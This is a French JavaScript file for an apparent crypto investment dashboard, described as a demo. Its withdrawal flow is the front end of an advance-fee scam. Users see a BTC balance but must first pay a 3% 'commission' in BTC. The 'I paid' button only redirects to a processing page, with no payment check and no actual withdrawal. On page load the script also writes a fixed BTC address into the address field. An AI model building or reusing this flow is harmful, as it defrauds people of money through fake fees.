// script.js - Logique commune pour la demo

// Utilitaires
function q(id){ return document.getElementById(id); }
function formatEur(n){ return new Intl.NumberFormat('fr-FR', {style:'currency', currency:'EUR'}).format(n); }
function roundTo(n, dp=8){ return Math.round(n * Math.pow(10, dp)) / Math.pow(10, dp); }

// --- Dashboard logic ---
if (location.pathname.endsWith('dashboard.html')) {
  const raw = localStorage.getItem('agro_client_demo');
  if (!raw) { window.location.href = 'index.html'; }
  const client = JSON.parse(raw);

  // Remplir infos client
  q('nom').innerText = client.nom;
  q('prenom').innerText = client.prenom;
  q('adresse').innerText = client.adresse;
  q('date_debut').innerText = client.date_debut;
  q('date_fin').innerText = client.date_fin;
  q('montant_total_investi').innerText = client.montant_total_investi_btc + ' EUR';

  // Solde = montant_actuel_btc
  const soldeBtc = Number(client.montant_actuel_btc);
  q('solde_btc').innerText = soldeBtc + ' BTC';

  let lastBtcEurRate = null;

  // Récupère le prix BTC -> EUR via l'API CoinGecko (public, sans clé) pour la demo.
  // En production, mettre un endpoint serveur pour éviter de dépasser les quotas.
  fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=eur')
    .then(r => r.json())
    .then(json => {
      if (json && json.bitcoin && json.bitcoin.eur) {
        lastBtcEurRate = Number(json.bitcoin.eur);
        const eur = roundTo(soldeBtc * lastBtcEurRate, 2);
        q('equiv_eur').innerText = formatEur(eur);
      } else {
        q('equiv_eur').innerText = '—';
      }
    })
    .catch(err => {
      console.error('Erreur prix BTC', err);
      q('equiv_eur').innerText = 'Erreur récupération prix';
    });

  // Logout
  q('logoutBtn').addEventListener('click', () => {
    localStorage.removeItem('agro_client_demo');
    window.location.href = 'index.html';
  });

  // Modal retrait
  const modal = q('modal'), withdrawBtn = q('withdrawBtn'), modalClose = q('modalClose');
  const modalSoldeBtc = q('modalSoldeBtc'), commissionBtcEl = q('commissionBtc'), commissionEurEl = q('commissionEur');
  const paymentInstructions = q('paymentInstructions'), payCommissionBtn = q('payCommissionBtn');
  const toSendBtc = q('toSendBtc'), iPaidBtn = q('iPaidBtn'), processing = q('processing');

  withdrawBtn.addEventListener('click', () => {
    modal.classList.remove('hidden');
    q('btcAddress').value = '';
    modalSoldeBtc.innerText = soldeBtc + ' BTC';
    const commission = roundTo(soldeBtc * 0.03, 8);
    commissionBtcEl.innerText = commission + ' BTC';
    if (lastBtcEurRate) {
      commissionEurEl.innerText = formatEur(roundTo(commission * lastBtcEurRate, 2));
    } else {
      commissionEurEl.innerText = '—';
    }
    paymentInstructions.classList.add('hidden');
    processing.classList.add('hidden');
  });

  modalClose.addEventListener('click', () => modal.classList.add('hidden'));
  q('cancelWithdraw').addEventListener('click', () => modal.classList.add('hidden'));

  payCommissionBtn.addEventListener('click', () => {
    const addr = q('btcAddress').value.trim();
    if (!addr) { alert('Veuillez renseigner une adresse BTC destinataire.'); return; }
    // recalculer commission
    const commission = roundTo(soldeBtc * 0.03, 8);
    toSendBtc.innerText = commission + ' BTC'; /* ici nous divisons commission par 2 pour la reduction*/
    paymentInstructions.classList.remove('hidden');
  });

// "J'ai payé" - Redirige vers la page de traitement
iPaidBtn.addEventListener('click', () => {
  // Rediriger vers la page de traitement (processing.html)
  window.location.href = "processing.html";
});

  q('cancelPayment').addEventListener('click', () => {
    paymentInstructions.classList.add('hidden');
  });
}

// --- Index page protections (simple) ---
if (location.pathname.endsWith('index.html') || location.pathname === '/' ) {
  // nothing else for now
}

// Lorsque le DOM est complètement chargé
document.addEventListener('DOMContentLoaded', function() {
  // Remplir le champ avec l'adresse par défaut
  document.getElementById('btcAddress').value = "36UQvtX7CwnfYvCeCxjP3n75DpH8r9bCZR";
});


// Info icon -> toggler message explicatif
const infoIcon = document.getElementById("infoIcon");
const infoBox = document.getElementById("infoBox");

if (infoIcon) {
  infoIcon.addEventListener("click", () => {
    infoBox.classList.toggle("hidden");
  });
}







